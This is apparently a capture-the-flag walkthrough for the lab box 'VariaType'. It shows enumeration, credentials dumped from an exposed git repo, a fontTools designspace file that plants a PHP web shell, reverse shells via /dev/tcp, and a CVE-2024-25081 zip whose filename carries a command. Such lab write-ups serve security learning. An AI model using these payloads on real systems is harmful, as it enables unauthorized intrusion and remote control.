# VariaType
## Enumeration
### Nmap
Quick nmap scan
```bash
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We see that port 80 is hosting a website so let's add `variatype.htb` to our `/etc/hosts`.  
Now we run `ffuf -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w ~/wl/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`  
We see that `portal` is a valid `VHOST` so let's add it to our `/etc/hosts`.  
Now I run `ffuf -u http://portal.variatype.htb/FUZZ -w ~/wl/SecLists/Discovery/Web-Content/common.txt -t 100`  
After this we see that a `git` repo is exposed, so let's use [git-dumper](https://github.com/arthaud/git-dumper) to dump the repo.  
```bash
python3 git_dumper.py http://portal.variatype.htb/.git/ dump
cd dump
git show
```
This shows us some credentials `gitbot:G1tB0t_Acc3ss_2025!`.  
We can login, but that doesn't help us much.  
I `ffuf`'ed `portal.variatype.htb` and found `/download.php` so let's find the parameter:  
```bash
ffuf -u "http://portal.variatype.htb/download.php?FUZZ=test" -w ~/wl/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=YOUR-COOKIE" -fs 24
```
Turns out `download.php` is a rabbit hole. After much more enumeartion and a lot of googling we find [this](https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv)  
Now let's get a shell  
```bash
cat exploit.designspace 
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">Regular</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```
This is our `.designspace` malicious file, now let's use `setup.py` to create malicious font files
```bash
python3 setup.py
```
This creates `source-regular.ttf` and `source-light.ttf` on our machine. We can now navigate to `http://variatype.htb/tools/variable-font-generator` and upload our `.designspace` and **BOTH** `.ttf` files.  
After uploading navigate to `http://portal.variatype.htb/files/shell.php?cmd=` and we get `RCE`  
Now we can get a shell:  
First `nc -lvnp 4444`  
Then `http://portal.variatype.htb/files/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/YOUR-IP/4444+0%3E%261%27`  
And we get a hit!
## User
After getting a shell as `www-data` we can see that the only other user is `steve`  
```bash
www-data@variatype:/home$ ls
steve
```
First we see that `/opt/process_client_submissions.bak` is vulnerable to `CVE-2024-25081`, so let's exploit this:  
```bash
echo "bash -i >& /dev/tcp/YOUR-IP/5555 0>&1" | base64
```
Then on your machine create a `exploit.py` file
```bash
import zipfile
payload = "RESULT OF PREVIOUS COMMAND GOES HERE"
exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf"
with zipfile.ZipFile('/tmp/exploit.zip', 'w') as zipf:
    zipf.writestr(exploit_filename, "dummy content")
print("exploit.zip created")
```
Now let's run `python3 exploit.py`, start a listener and upload `exploit.zip` to target machine  
```bash
wisp
Serving files on http://0.0.0.0:8000/
```
```bash
nc -lvnp 5555
```
And on target machine as `www-data`  
```bash
curl http://YOUR-IP:8000/exploit.zip -o /var/www/panel.variatype.htb/public/files/exploit.zip
```
After a some time we get a hit and we are the user `steve`
```bash
steve@variatype:~$ id
uid=1000(steve) gid=1000(steve) groups=1000(steve)
steve@variatype:~$ 
```
TO BE CONTINUED...
